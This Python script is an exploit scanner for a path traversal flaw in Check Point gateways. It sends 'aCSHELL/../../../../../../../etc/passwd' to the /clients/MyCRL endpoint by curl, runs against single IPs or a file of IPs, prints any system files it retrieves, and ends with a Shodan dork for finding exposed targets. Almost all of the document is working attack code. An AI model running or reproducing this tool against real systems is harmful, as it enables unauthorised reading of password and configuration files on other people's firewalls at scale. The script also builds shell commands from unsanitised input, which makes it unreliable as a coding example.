import subprocess
from colorama import Fore, Style, init
init(autoreset=True)

# ANSI escape codes for coloring
BLUE = '\033[94m'
ORANGE = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

ascii_art = """

 ▄▀▀█▄   ▄▀▀▀█▄    ▄▀▀▄▀▀▀▄ 
▐ ▄▀ ▀▄ █  ▄▀  ▀▄ █   █   █ 
  █▄▄▄█ ▐ █▄▄▄▄   ▐  █▀▀█▀  
 ▄▀   █  █    ▐    ▄▀    █  
█   ▄▀   █        █     █   
▐   ▐   █         ▐     ▐   
        ▐                   
"""

print(Fore.MAGENTA + ascii_art)

def check_vulnerability(ip, file_name="etc/passwd"):
    # Try different curl commands with various SSL options
    commands = [
        # Disable SSL verification
        f"curl -i -s -k -X POST \
           -H 'Host: {ip}' \
           -H 'Content-Length: 39' \
           --data-binary 'aCSHELL/../../../../../../../{file_name}' \
           'https://{ip}/clients/MyCRL'",

        # Specify SSL version (TLSv1.2)
        f"curl -i -s -k -X POST \
           -H 'Host: {ip}' \
           -H 'Content-Length: 39' \
           --data-binary 'aCSHELL/../../../../../../../{file_name}' \
           --tlsv1.2 \
           'https://{ip}/clients/MyCRL'"
    ]

    for command in commands:
        try:
            output = subprocess.check_output(command, shell=True, text=True)
            if any(word in output for word in ["root", "admin", "nobody"]):
                print(f"{RED}{ip} is vulnerable.{RESET}")
                return "vulnerable", output
        except subprocess.CalledProcessError as e:
            continue

    print(f"{GREEN}{ip} is not vulnerable.{RESET}")
    return "not-vulnerable", None

def main():
    # Ask the user for input method
    input_method = input(f"{BLUE}Would you like to scan (1) a list of IPs from a file or (2) enter a single IP address? (1/2):{RESET} ").strip()

    if input_method == '1':
        # If the user chooses to scan a list of IPs
        file_name = input(f"{BLUE}Please enter the file name containing the IP addresses (e.g., ips.txt):{RESET} ").strip()

        # Check if the file exists and read the IPs from the file
        try:
            with open(file_name, 'r') as file:
                ips = file.readlines()
        except FileNotFoundError:
            print(f"{RED}Error: File '{file_name}' not found.{RESET}")
            return

        # Iterate through each IP and check for vulnerability
        for ip in ips:
            ip = ip.strip()  # Remove any leading/trailing whitespace
            if ip:
                check_vulnerability(ip)  # Only print if vulnerable or not

    elif input_method == '2':
        # If the user chooses to enter a single IP
        ip = input(f"{BLUE}Please enter the target IP address:{RESET} ").strip()

        # If the user doesn't provide an IP, exit the script
        if not ip:
            print(f"{RED}No IP address provided. Exiting...{RESET}")
            return

        result, output = check_vulnerability(ip)

        # Print response body directly
        if result == "vulnerable":
            print(f"{RED}{output}{RESET}")
        else:
            print(f"{GREEN}Response body for {ip} is not vulnerable.{RESET}")

if __name__ == "__main__":
    main()


"""
SHODAN DORK
title:"Check Point" "Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7"
"""
